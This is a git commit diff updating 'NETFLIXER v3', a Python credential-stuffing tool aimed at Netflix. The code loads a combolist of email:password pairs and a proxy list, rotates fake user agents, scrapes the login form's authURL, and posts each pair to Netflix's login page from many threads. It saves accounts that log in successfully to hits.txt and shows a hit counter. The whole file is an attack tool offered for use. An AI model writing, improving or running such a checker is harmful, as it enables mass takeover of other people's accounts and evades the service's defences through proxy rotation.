81efcb2a5b0bd34cd79b9a5678392c29d821ab62
Plαsmonix <100349657+Plasmonix@users.noreply.github.com>
2022-03-31 12:18:22 +0530

    🔨Update v3

--- main.py
+++ main.py
@@ -1,25 +1,46 @@
-import os,requests,random
+import os,requests,random,threading,ctypes,time
 from fake_useragent import UserAgent
 from bs4 import BeautifulSoup as Soup
 
-YELLOW = '\033[93m'
-GREEN = '\033[32m'
-RED = '\033[91m'
-RESET = '\033[0m' 
+class Fore:
+    YELLOW = '\033[93m'
+    GREEN = '\033[32m'
+    RED = '\033[91m'
+    CYAN = '\033[36m'
+    RESET = '\033[0m' 
+    
+lock = threading.Lock()
+threads,proxies,combos,valid,invalid,cpm,check,proxytype = [],[],[],0,0,0,None,None
+
+def cpm_counter():
+    global cpm
+    while True:
+        old = valid
+        time.sleep(4)
+        new = valid
+        cpm = (new-old) * 15
+
+def update_title():
+    while True:
+        elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - start))
+        ctypes.windll.kernel32.SetConsoleTitleW(f'[NETFLIXER v3] - Hits: {valid} | Bad: {invalid} | CPM: {cpm} | Threads: {threading.active_count() - 2} | Time elapsed: {elapsed}')
+        time.sleep(0.4)
 
 def banner():
-    os.system('cls && title [NETFLIXER v2] - Made by Plasmonix' if os.name == "nt" else 'clear') 
-    text = """    
-                       ███▄    █ ▓█████▄▄▄█████▓  █████▒██▓     ██▓▒██   ██▒▓█████  ██▀███  
-                       ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓██   ▒▓██▒    ▓██▒▒▒ █ █ ▒░▓█   ▀ ▓██ ▒ ██▒
-                      ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒████ ░▒██░    ▒██▒░░  █   ░▒███   ▓██ ░▄█ ▒
-                      ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░▓█▒  ░▒██░    ░██░ ░ █ █ ▒ ▒▓█  ▄ ▒██▀▀█▄  
-                      ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░▒█░   ░██████▒░██░▒██▒ ▒██▒░▒████▒░██▓ ▒██▒
-                      ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░    ▒ ░   ░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒▓ ░▒▓░
-                      ░ ░░   ░ ▒░ ░ ░  ░   ░     ░     ░ ░ ▒  ░ ▒ ░░░   ░▒ ░ ░ ░  ░  ░▒ ░ ▒░
-                         ░   ░ ░    ░    ░       ░ ░     ░ ░    ▒ ░ ░    ░     ░     ░░   ░ 
-                               ░    ░  ░                   ░  ░ ░   ░    ░     ░  ░   ░     """
-    faded = ""
+    os.system('cls')
+    ctypes.windll.kernel32.SetConsoleTitleW(f'[NETFLIXER v3] - Made by Plasmonix') 
+    text = '''    
+                      ███▄    █ ▓█████▄▄▄█████▓  █████▒██▓     ██▓▒██   ██▒▓█████  ██▀███  
+                      ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓██   ▒▓██▒    ▓██▒▒▒ █ █ ▒░▓█   ▀ ▓██ ▒ ██▒
+                     ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒████ ░▒██░    ▒██▒░░  █   ░▒███   ▓██ ░▄█ ▒
+                     ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░▓█▒  ░▒██░    ░██░ ░ █ █ ▒ ▒▓█  ▄ ▒██▀▀█▄  
+                     ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░▒█░   ░██████▒░██░▒██▒ ▒██▒░▒████▒░██▓ ▒██▒
+                     ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░    ▒ ░   ░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒▓ ░▒▓░
+                     ░ ░░   ░ ▒░ ░ ░  ░   ░     ░     ░ ░ ▒  ░ ▒ ░░░   ░▒ ░ ░ ░  ░  ░▒ ░ ▒░
+                        ░   ░ ░    ░    ░       ░ ░     ░ ░    ▒ ░ ░    ░     ░     ░░   ░ 
+                              ░    ░  ░                   ░  ░ ░   ░    ░     ░  ░   ░     '''
+    
+    faded = ''
     red = 40
     for line in text.splitlines():
         faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
@@ -28,82 +49,124 @@ def banner():
             if red > 255:
                 red = 255
     print(faded)
-    print(YELLOW + "                                       github.com/Plasmonix Version 2.0 \n" + RESET)
+    print(f'{Fore.YELLOW}                                     github.com/Plasmonix Version 3.0\n {Fore.RESET}')
 
-proxies = []
 def load_proxies():
     try:
-        proxyfile = open("proxies.txt", "r").readlines()
+        path = input(f'[{Fore.CYAN}*{Fore.RESET}] Path to proxy file> ')
+        proxyfile = open(path, "r").readlines()
+
+        choice = int(input(f'[{Fore.CYAN}?{Fore.RESET}] Proxy type [{Fore.CYAN}0{Fore.RESET}]HTTPS/[{Fore.CYAN}1{Fore.RESET}]SOCKS4/[{Fore.CYAN}2{Fore.RESET}]SOCKS5> '))
+        if choice == 0:
+            proxytype = 'https'                          
+        elif choice == 1:
+            proxytype = 'socks4'
+        elif choice == 2:
+            proxytype = 'socks5'
+        else:
+            print(Fore.RED+'[ERROR] Please enter a valid choice such as 0, 1 or 2!'+Fore.RESET)
+
         for proxy in proxyfile:
             ip = proxy.split(":")[0]
             port = proxy.split(":")[1]
-            proxies.append({'https': 'http://'+ ip + ':' + port.rstrip("\n")})
-    except FileNotFoundError:
-           print(RED + " [ERROR] proxies.txt not found" + RESET)
+            proxies.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
 
-def load_combo():
-    global email,password
-    try:
-        combolist = open("combo.txt", "r").readlines()
-        for combos in combolist:
-            email = combos.split(":")[0]
-            password=combos.split(":")[1]
-            check_account(email,password)
     except FileNotFoundError:
-           print(RED + " [ERROR] combo.txt not found" + RESET)
+           print(Fore.RED+'[ERROR] Failed to open proxyfile'+Fore.RESET)
+           quit()
 
-def random_proxy(proxy):
-    return random.choice(proxy)
+    except ValueError:
+        print(Fore.RED+'[ERROR] Value must be an integer'+Fore.RESET)
+        quit()
+
+def worker(combos, thread_id):
+    global check
+    while check[thread_id] < len(combos):
+        combination = combos[check[thread_id]].split(':')
+        check_account(combination[0], combination[1])
+        check[thread_id] += 1 
 
 def check_account(email,password):
-    client = requests.Session()
-    proxy = random_proxy(proxies)
-    login = client.get("https://www.netflix.com/login")
-    soup = Soup(login.text,'html.parser')
-    loginForm = soup.find('form')
-    authURL = loginForm.find('input', {'name': 'authURL'}).get('value')
-    
-    headers = {
-        "user-agent": UserAgent().random,
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
-        "accept-language": "en-US,en;q=0.9", 
-        "accept-encoding": "gzip, deflate, br", 
-        "referer": "https://www.netflix.com/login", 
-        "content-type": "application/x-www-form-urlencoded",
-        "cookie":""
-    }
-
-    data = {
-        "userLoginId:": (email), 
-        "password": (password), 
-        "rememberMeCheckbox": "true", 
-        "flow": "websiteSignUp", 
-        "mode": "login", 
-        "action": "loginAction", 
-        "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode,recaptchaResponseToken,recaptchaError,recaptchaResponseTime", 
-        "authURL": (authURL), 
-        "nextPage": "https://www.netflix.com/browse",
-        "countryCode": "+1",
-        "countryIsoCode": "US",
-        "recaptchaResponseToken": "",
-        "recaptchaResponseTime": "473"
-    }
-    
-    try:
+    global valid,invalid
+    try:     
+        client = requests.Session()
+        proxy = random.choice(proxies)
+        login = client.get("https://www.netflix.com/login")
+        soup = Soup(login.text,'html.parser')
+        loginForm = soup.find('form')
+        authURL = loginForm.find('input', {'name': 'authURL'}).get('value')   
+        
+        headers = {
+            "user-agent": UserAgent().random,
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
+            "accept-language": "en-US,en;q=0.9", 
+            "accept-encoding": "gzip, deflate, br", 
+            "referer": "https://www.netflix.com/login", 
+            "content-type": "application/x-www-form-urlencoded",
+            "cookie":""
+        }
+        data = {
+            "userLoginId:": (email), 
+            "password": (password), 
+            "rememberMeCheckbox": "true", 
+            "flow": "websiteSignUp", 
+            "mode": "login", 
+            "action": "loginAction", 
+            "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode", 
+            "authURL": (authURL), 
+            "nextPage": "https://www.netflix.com/browse",
+            "countryCode": "+1",
+            "countryIsoCode": "US"
+        }  
+        
         request = client.post("https://www.netflix.com/login",headers=headers,data=data,proxies=proxy)
+    
     except:
-        print(RED + " [ERROR] Failed to establish connection" + RESET)
+        print(Fore.RED+'[ERROR] Proxy timeout. Change your proxies or use a different VPN'+Fore.RESET)
         quit()
 
     logged = request.text.find('name="authURL"')
     if logged == -1:
-        print(GREEN +" [GOOD] " + email + ":" + password.rstrip("\n")+ RESET)
-        file = open("hits.txt","a")
-        file.write(email + ":" + password)
+        lock.acquire()
+        print(Fore.GREEN+'[GOOD] '+email+':'+password+Fore.RESET)
+        valid+=1
+        file = open("hits.txt","a").write(email+":"+password+"\n")   
+        lock.release()
     else:
-        print(RED +" [BAD] " + email + ":" + password.rstrip("\n")+ RESET)
+        lock.acquire()
+        print(Fore.RED+'[BAD] '+email+':'+password+Fore.RESET)
+        invalid+=1
+        lock.release()
 
-if __name__ == "__main__":
+if __name__ =='__main__':
     banner()
     load_proxies()
-    load_combo()
+    try:
+        path = input(f'[{Fore.CYAN}*{Fore.RESET}] Path to combolist> ')
+        combolist = open(path, "r").readlines()        
+        for combo in combolist:
+            combos.append(combo.replace('\n', ''))           
+        threadcount = int(input(f'[{Fore.CYAN}*{Fore.RESET}] Threads> '))
+    
+    except FileNotFoundError:
+        print(Fore.RED+'[ERROR] Failed to open combolist'+Fore.RESET)
+        quit()
+
+    except ValueError:
+        print(Fore.RED+'[ERROR] Value must be an integer'+Fore.RESET)
+        quit() 
+
+    os.system('cls')
+    banner()
+    start = time.time()
+    threading.Thread(target=cpm_counter,daemon=True).start()
+    threading.Thread(target=update_title,daemon=True).start() 
+
+    check = [0 for i in range(threadcount)]
+    for i in range(threadcount):
+        sliced = combos[int(len(combos)/threadcount*i):int(len(combos)/threadcount*(i+1))]
+        t = threading.Thread(target=worker,args=(sliced, i,))
+        threads.append(t)
+        t.start()
+    for t in threads:
+        t.join()
